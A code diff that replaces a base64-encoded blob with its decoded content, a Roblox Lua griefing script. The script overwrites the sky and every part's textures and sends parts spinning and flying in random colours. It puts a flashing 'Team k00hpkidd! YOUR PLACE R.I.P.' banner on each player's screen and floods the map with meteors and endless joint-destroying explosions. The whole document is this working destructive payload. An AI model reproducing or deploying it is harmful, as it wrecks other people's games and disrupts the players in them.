@@ -1,1 +1,167 @@
-bG9jYWwgc2t5SWQgPSAicmJ4YXNzZXRpZDovLzExNDg5OTEyNTE4NTA4NiIKbG9jYWwgdGV4dHVyZUlkID0gInJieGFzc2V0aWQ6Ly8xMTQ4OTkxMjUxODUwODYiCmxvY2FsIHRleHRNZXNzYWdlID0gIlRlYW0gazAwaHBraWRkIVxuWU9VUiBQTEFDRSBSLkkuUC4iCgpsb2NhbCBtYXBTaXplID0gMTIwMApsb2NhbCBleHBsb3Npb25QZXJSb3VuZCA9IDMwMApsb2NhbCBkZWxheVRpbWUgPSAwLjE1Cgpsb2NhbCBMaWdodGluZyA9IGdhbWU6R2V0U2VydmljZSgiTGlnaHRpbmciKQpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKCmxvY2FsIHNreSA9IEluc3RhbmNlLm5ldygiU2t5IikKc2t5LlNreWJveEJrID0gc2t5SWQKc2t5LlNreWJveERuID0gc2t5SWQKc2t5LlNreWJveEZ0ID0gc2t5SWQKc2t5LlNreWJveExmID0gc2t5SWQKc2t5LlNreWJveFJ0ID0gc2t5SWQKc2t5LlNreWJveFVwID0gc2t5SWQKc2t5LlBhcmVudCA9IExpZ2h0aW5nCgpmb3IgXywgb2JqIGluIGlwYWlycyh3b3Jrc3BhY2U6R2V0RGVzY2VuZGFudHMoKSkgZG8KCWlmIG9iajpJc0EoIkJhc2VQYXJ0IikgdGhlbgoKCQlmb3IgXywgZmFjZSBpbiBpcGFpcnMoRW51bS5Ob3JtYWxJZDpHZXRFbnVtSXRlbXMoKSkgZG8KCQkJbG9jYWwgdCA9IEluc3RhbmNlLm5ldygiVGV4dHVyZSIpCgkJCXQuVGV4dHVyZSA9IHRleHR1cmVJZAoJCQl0LkZhY2UgPSBmYWNlCgkJCXQuUGFyZW50ID0gb2JqCgkJZW5kCgoJCXRhc2suc3Bhd24oZnVuY3Rpb24oKQoJCQl3aGlsZSBvYmouUGFyZW50IGRvCgkJCQlvYmouUm90YXRpb24gPSBWZWN0b3IzLm5ldygKCQkJCQltYXRoLnJhbmRvbSgwLDM2MCksCgkJCQkJbWF0aC5yYW5kb20oMCwzNjApLAoJCQkJCW1hdGgucmFuZG9tKDAsMzYwKQoJCQkJKQoJCQkJb2JqLkNvbG9yID0gQ29sb3IzLm5ldyhtYXRoLnJhbmRvbSgpLCBtYXRoLnJhbmRvbSgpLCBtYXRoLnJhbmRvbSgpKQoKCQkJCWlmIG1hdGgucmFuZG9tKDEsNDApID09IDEgdGhlbgoJCQkJCW9iai5Bc3NlbWJseUxpbmVhclZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoCgkJCQkJCW1hdGgucmFuZG9tKC0xNTAsMTUwKSwKCQkJCQkJbWF0aC5yYW5kb20oNDAsMjAwKSwKCQkJCQkJbWF0aC5yYW5kb20oLTE1MCwxNTApCgkJCQkJKQoJCQkJZW5kCgoJCQkJdGFzay53YWl0KDAuMikKCQkJZW5kCgkJZW5kKQoJZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gZ2l2ZVRleHRMYWJlbChwbGF5ZXIpCglsb2NhbCBndWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCglndWkuUmVzZXRPblNwYXduID0gZmFsc2UKCWd1aS5QYXJlbnQgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJQbGF5ZXJHdWkiKQoKCWxvY2FsIGxhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQoJbGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygxLDAsMCwxMjApCglsYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC4yCglsYWJlbC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLm5ldygwLDAsMCkKCWxhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMubmV3KDEsMCwwKQoJbGFiZWwuVGV4dFNjYWxlZCA9IHRydWUKCWxhYmVsLlRleHQgPSB0ZXh0TWVzc2FnZQoJbGFiZWwuUGFyZW50ID0gZ3VpCgoJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJd2hpbGUgbGFiZWwuUGFyZW50IGRvCgkJCWxhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMubmV3KG1hdGgucmFuZG9tKCksIG1hdGgucmFuZG9tKCksIG1hdGgucmFuZG9tKCkpCgkJCXRhc2sud2FpdCgwLjIpCgkJZW5kCgllbmQpCmVuZAoKZm9yIF8sIHAgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwoJZ2l2ZVRleHRMYWJlbChwKQplbmQKUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGdpdmVUZXh0TGFiZWwpCmxvY2FsIGZ1bmN0aW9uIHJhbmRQb3MoKQoJcmV0dXJuIFZlY3RvcjMubmV3KAoJCW1hdGgucmFuZG9tKC1tYXBTaXplLCBtYXBTaXplKSwKCQltYXRoLnJhbmRvbSgxMCwxNTApLAoJCW1hdGgucmFuZG9tKC1tYXBTaXplLCBtYXBTaXplKQoJKQplbmQKCnRhc2suc3Bhd24oZnVuY3Rpb24oKQoJd2hpbGUgdHJ1ZSBkbwoJCWlmIG1hdGgucmFuZG9tKDEsOCkgPT0gMSB0aGVuCgkJCWxvY2FsIGZsYXNoID0gSW5zdGFuY2UubmV3KCJQb2ludExpZ2h0IikKCQkJZmxhc2guQnJpZ2h0bmVzcyA9IDgKCQkJZmxhc2guUmFuZ2UgPSA1MAoJCQlmbGFzaC5Db2xvciA9IENvbG9yMy5uZXcoMSwgbWF0aC5yYW5kb20oKSwgbWF0aC5yYW5kb20oKSkKCQkJZmxhc2guUGFyZW50ID0gd29ya3NwYWNlCgoJCQl0YXNrLmRlbGF5KDAuMDcsIGZ1bmN0aW9uKCkKCQkJCWZsYXNoOkRlc3Ryb3koKQoJCQllbmQpCgkJZW5kCgkJdGFzay53YWl0KDAuMSkKCWVuZAplbmQpCgpsb2NhbCBmdW5jdGlvbiBzcGF3bk1ldGVvcigpCglsb2NhbCBtZXRlb3IgPSBJbnN0YW5jZS5uZXcoIlBhcnQiKQoJbWV0ZW9yLlNoYXBlID0gRW51bS5QYXJ0VHlwZS5CYWxsCgltZXRlb3IuU2l6ZSA9IFZlY3RvcjMubmV3KDEwLDEwLDEwKQoJbWV0ZW9yLkNvbG9yID0gQ29sb3IzLm5ldygwLjIsMC4yLDAuMikKCW1ldGVvci5NYXRlcmlhbCA9IEVudW0uTWF0ZXJpYWwuU2xhdGUKCW1ldGVvci5BbmNob3JlZCA9IGZhbHNlCgltZXRlb3IuQ2FuQ29sbGlkZSA9IHRydWUKCW1ldGVvci5Qb3NpdGlvbiA9IFZlY3RvcjMubmV3KAoJCW1hdGgucmFuZG9tKC1tYXBTaXplLG1hcFNpemUpLAoJCW1hdGgucmFuZG9tKDE4MCwyNjApLAoJCW1hdGgucmFuZG9tKC1tYXBTaXplLG1hcFNpemUpCgkpCgltZXRlb3IuUGFyZW50ID0gd29ya3NwYWNlCgoJbG9jYWwgYnYgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIpCglidi5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KAoJCW1hdGgucmFuZG9tKC0xNSwxNSksCgkJLW1hdGgucmFuZG9tKDE1MCwyMzApLAoJCW1hdGgucmFuZG9tKC0xNSwxNSkKCSkKCWJ2Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcoMWU3LDFlNywxZTcpCglidi5QYXJlbnQgPSBtZXRlb3IKCgltZXRlb3IuVG91Y2hlZDpDb25uZWN0KGZ1bmN0aW9uKGhpdCkKCQlpZiBtZXRlb3IuUGFyZW50ID09IG5pbCB0aGVuIHJldHVybiBlbmQKCgkJbG9jYWwgZSA9IEluc3RhbmNlLm5ldygiRXhwbG9zaW9uIikKCQllLlBvc2l0aW9uID0gbWV0ZW9yLlBvc2l0aW9uCgkJZS5CbGFzdFJhZGl1cyA9IDMwCgkJZS5CbGFzdFByZXNzdXJlID0gMzUwMDAwCgkJZS5EZXN0cm95Sm9pbnRSYWRpdXNQZXJjZW50ID0gMQoJCWUuUGFyZW50ID0gd29ya3NwYWNlCgoJCW1ldGVvcjpEZXN0cm95KCkKCWVuZCkKCgl0YXNrLmRlbGF5KDEwLCBmdW5jdGlvbigpCgkJaWYgbWV0ZW9yIGFuZCBtZXRlb3IuUGFyZW50IHRoZW4KCQkJbWV0ZW9yOkRlc3Ryb3koKQoJCWVuZAoJZW5kKQplbmQKCnRhc2suc3Bhd24oZnVuY3Rpb24oKQoJd2hpbGUgdHJ1ZSBkbwoJCXNwYXduTWV0ZW9yKCkKCQl0YXNrLndhaXQoMC4yNSkKCWVuZAplbmQpCgp3aGlsZSB0cnVlIGRvCglmb3IgXyA9IDEsIGV4cGxvc2lvblBlclJvdW5kIGRvCgkJbG9jYWwgZSA9IEluc3RhbmNlLm5ldygiRXhwbG9zaW9uIikKCQllLlBvc2l0aW9uID0gcmFuZFBvcygpCgkJZS5CbGFzdFByZXNzdXJlID0gbWF0aC5yYW5kb20oMCwzMDAwMDApCgkJZS5CbGFzdFJhZGl1cyA9IG1hdGgucmFuZG9tKDUsMjUpCgkJZS5EZXN0cm95Sm9pbnRSYWRpdXNQZXJjZW50ID0gMQoJCWUuUGFyZW50ID0gd29ya3NwYWNlCgllbmQKCgl0YXNrLndhaXQoZGVsYXlUaW1lKQplbmQK
+local skyId = "rbxassetid://114899125185086"
+local textureId = "rbxassetid://114899125185086"
+local textMessage = "Team k00hpkidd!\nYOUR PLACE R.I.P."
+
+local mapSize = 1200
+local explosionPerRound = 300
+local delayTime = 0.15
+
+local Lighting = game:GetService("Lighting")
+local Players = game:GetService("Players")
+
+local sky = Instance.new("Sky")
+sky.SkyboxBk = skyId
+sky.SkyboxDn = skyId
+sky.SkyboxFt = skyId
+sky.SkyboxLf = skyId
+sky.SkyboxRt = skyId
+sky.SkyboxUp = skyId
+sky.Parent = Lighting
+
+for _, obj in ipairs(workspace:GetDescendants()) do
+	if obj:IsA("BasePart") then
+
+		for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
+			local t = Instance.new("Texture")
+			t.Texture = textureId
+			t.Face = face
+			t.Parent = obj
+		end
+
+		task.spawn(function()
+			while obj.Parent do
+				obj.Rotation = Vector3.new(
+					math.random(0,360),
+					math.random(0,360),
+					math.random(0,360)
+				)
+				obj.Color = Color3.new(math.random(), math.random(), math.random())
+
+				if math.random(1,40) == 1 then
+					obj.AssemblyLinearVelocity = Vector3.new(
+						math.random(-150,150),
+						math.random(40,200),
+						math.random(-150,150)
+					)
+				end
+
+				task.wait(0.2)
+			end
+		end)
+	end
+end
+
+local function giveTextLabel(player)
+	local gui = Instance.new("ScreenGui")
+	gui.ResetOnSpawn = false
+	gui.Parent = player:WaitForChild("PlayerGui")
+
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(1,0,0,120)
+	label.BackgroundTransparency = 0.2
+	label.BackgroundColor3 = Color3.new(0,0,0)
+	label.TextColor3 = Color3.new(1,0,0)
+	label.TextScaled = true
+	label.Text = textMessage
+	label.Parent = gui
+
+	task.spawn(function()
+		while label.Parent do
+			label.TextColor3 = Color3.new(math.random(), math.random(), math.random())
+			task.wait(0.2)
+		end
+	end)
+end
+
+for _, p in ipairs(Players:GetPlayers()) do
+	giveTextLabel(p)
+end
+Players.PlayerAdded:Connect(giveTextLabel)
+local function randPos()
+	return Vector3.new(
+		math.random(-mapSize, mapSize),
+		math.random(10,150),
+		math.random(-mapSize, mapSize)
+	)
+end
+
+task.spawn(function()
+	while true do
+		if math.random(1,8) == 1 then
+			local flash = Instance.new("PointLight")
+			flash.Brightness = 8
+			flash.Range = 50
+			flash.Color = Color3.new(1, math.random(), math.random())
+			flash.Parent = workspace
+
+			task.delay(0.07, function()
+				flash:Destroy()
+			end)
+		end
+		task.wait(0.1)
+	end
+end)
+
+local function spawnMeteor()
+	local meteor = Instance.new("Part")
+	meteor.Shape = Enum.PartType.Ball
+	meteor.Size = Vector3.new(10,10,10)
+	meteor.Color = Color3.new(0.2,0.2,0.2)
+	meteor.Material = Enum.Material.Slate
+	meteor.Anchored = false
+	meteor.CanCollide = true
+	meteor.Position = Vector3.new(
+		math.random(-mapSize,mapSize),
+		math.random(180,260),
+		math.random(-mapSize,mapSize)
+	)
+	meteor.Parent = workspace
+
+	local bv = Instance.new("BodyVelocity")
+	bv.Velocity = Vector3.new(
+		math.random(-15,15),
+		-math.random(150,230),
+		math.random(-15,15)
+	)
+	bv.MaxForce = Vector3.new(1e7,1e7,1e7)
+	bv.Parent = meteor
+
+	meteor.Touched:Connect(function(hit)
+		if meteor.Parent == nil then return end
+
+		local e = Instance.new("Explosion")
+		e.Position = meteor.Position
+		e.BlastRadius = 30
+		e.BlastPressure = 350000
+		e.DestroyJointRadiusPercent = 1
+		e.Parent = workspace
+
+		meteor:Destroy()
+	end)
+
+	task.delay(10, function()
+		if meteor and meteor.Parent then
+			meteor:Destroy()
+		end
+	end)
+end
+
+task.spawn(function()
+	while true do
+		spawnMeteor()
+		task.wait(0.25)
+	end
+end)
+
+while true do
+	for _ = 1, explosionPerRound do
+		local e = Instance.new("Explosion")
+		e.Position = randPos()
+		e.BlastPressure = math.random(0,300000)
+		e.BlastRadius = math.random(5,25)
+		e.DestroyJointRadiusPercent = 1
+		e.Parent = workspace
+	end
+
+	task.wait(delayTime)
+end
